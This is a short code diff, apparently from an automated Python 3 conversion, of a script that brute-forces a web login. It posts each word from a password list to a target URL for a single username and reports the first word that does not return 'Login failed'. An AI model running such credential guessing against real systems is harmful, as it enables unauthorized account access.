@@ -4,7 +4,7 @@
 #
 # Currently accepts single username input and password file
 #
-#!/usr/bin/env python
+# !/usr/bin/env python
 
 import requests
 import argparse
@@ -56,7 +56,7 @@ with open(wordlist, "r") as wordlist:
     data_dict["password"] = word
     response = requests.post(target, data=data_dict)
     if "Login failed" not in response.content:
-      print("[+] Login found --> " + word)
+      print(("[+] Login found --> " + word))
       exit()
 
 print("[-] End of file reached - no password found")
